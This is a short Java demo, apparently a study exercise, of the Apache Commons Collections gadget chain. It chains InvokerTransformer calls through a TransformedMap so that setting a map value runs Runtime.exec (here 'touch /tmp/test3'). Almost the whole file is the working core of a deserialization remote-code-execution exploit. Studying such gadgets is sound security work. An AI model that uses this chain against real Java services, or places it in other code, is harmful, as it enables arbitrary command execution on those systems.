import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by kenvi on 15/11/26.
 */
public class FullDemo {
    public static void main(String [] args) throws Exception {

        //序列化的结果
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),//-->Runtime.class
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),//Runtime.class.getMethod("getRunTime") --> Runtime.getRuntime()[method]
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
                        new Object[]{null, new Object[0]}),// call  Runtime.getRuntime()-->Runtime[instance]
                new InvokerTransformer("exec", new Class[]{String.class},//Runtime.exec("touch /tmp/test");
                        new Object[]{"touch /tmp/test3"})
        };

        Runtime.getRuntime().exec("touch /tmp/test");
        Transformer chain = new ChainedTransformer(transformers) ;
        Map innerMap = new HashMap() ;
        innerMap.put("value", "value") ;
        Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;

        //装饰
        //value-->chain(value)

        //序列化后的对象setValue
        Map.Entry entry = (Map.Entry)outerMap.entrySet().iterator().next();
        entry.setValue("test");

    }
}
